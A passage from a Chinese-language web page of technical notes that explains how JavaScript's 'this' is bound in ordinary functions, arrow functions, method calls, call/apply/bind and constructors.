</code></pre></div></li></ol> <h2 id="this的指向问题"><a href="#this的指向问题" class="header-anchor">#</a> this的指向问题</h2> <p>普通函数（非箭头函数）被调用时（即运行时）才会确定该函数内this的指向。因为在函数中this与arguments是两个特殊的变量，在函数被调用时才会取得它们，而且搜索这两个变量时只会在活动对象范围里面去搜。</p> <p>箭头函数中的this在<strong>函数定义的时候</strong>就已经确定，它this指向的是它的外层作用域上下文this的指向。</p> <ol><li><p>函数直接执行: test()</p> <p>指向全局对象，浏览器为window，严格模式下为undefined。</p></li> <li><p>作为对象属性调用: xxx.test()</p> <p>谁调用这个函数的，this就指向谁。</p></li> <li><p>call、apply、bind</p> <p>指向传的第一个参数 。</p></li> <li><p>new</p> <p>this指向实例函数，也就是被new出来的新对象。</p></li></ol></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">最近更新:</span> <span class="time">2/9/2021, 2:10:10 PM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/foundation/" class="prev router-link-active">
        技术积累
      </a></span> <span class="next"><a href="/foundation/framework.html">
        框架
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.81356f24.js" defer></script><script src="/assets/js/2.2bdd9eae.js" defer></script><script src="/assets/js/7.2d2d56a7.js" defer></script>
  </body>
</html>
